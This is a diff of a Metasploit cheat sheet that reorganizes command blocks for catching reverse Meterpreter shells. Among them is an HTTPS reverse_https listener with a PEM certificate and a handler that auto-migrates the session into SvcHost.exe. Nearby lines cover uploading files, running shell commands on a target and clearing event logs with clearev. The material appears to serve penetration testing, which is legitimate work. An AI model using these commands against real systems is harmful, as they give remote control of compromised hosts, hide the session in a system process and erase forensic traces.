@@ -132,6 +132,34 @@ resource [Path to Resource Script] [param 1] [param 2] [param 3]
 * exploit/multi/script/web_delivery
 
 # Meterpreter
+### Listener
+##### Start Handler with AutoRunScript to Migrate Process
+```bash
+use exploit/multi/handler
+set AutoRunScript migrate -n SvcHost.exe
+set LHOST [Attack Host]
+set LPORT [Port]
+run -j
+```
+##### Multi Handler
+```bash
+use exploit/multi/handler
+set LHOST [Attack Host]
+set LPORT [Port]
+set PAYLOAD [Payload]
+run -j
+```
+##### HTTPS Handler with PEM
+```bash
+use exploit/multi/handler
+set LHOST [Attack Host]
+set LPORT 443
+set HandlerSSLCert [Path to PEM generated]
+set StagerVerifySSLCert true
+set PAYLOAD windows/meterpreter/reverse_https
+run -j
+```
+
 ### Processes
 ##### Get Processes
 ```bash
@@ -161,14 +189,6 @@ meterpreter > service status-all
 ##### Upload File
 ```bash
 upload [Source] [Destination]
-```
-##### Start Handler with AutoRunScript to Migrate Process
-```bash
-use exploit/multi/handler
-set AutoRunScript migrate -n SvcHost.exe
-set LHOST [Attack Host]
-set LPORT [Port]
-run -j
 ```
 ##### Execute Shell Commands on Target
 ```bash
@@ -344,26 +364,6 @@ run
 ##### Clear System Logs
 ```bash
 meterpreter > clearev
-```
-
-### Multi Handler
-##### Multi Handler
-```bash
-use exploit/multi/handler
-set LHOST [Attack Host]
-set LPORT [Port]
-set PAYLOAD [Payload specified in msfvenom]
-run -j
-```
-##### Multi Handler with PEM
-```bash
-use exploit/multi/handler
-set LHOST [Attack Host]
-set LPORT [Port]
-set HandlerSSLCert [Path to PEM generated]
-set StagerVerifySSLCert true
-set PAYLOAD [Payload specified in msfvenom]
-run -j
 ```
 
 ### HTTPS Reverse Shell with Impersonate SSL
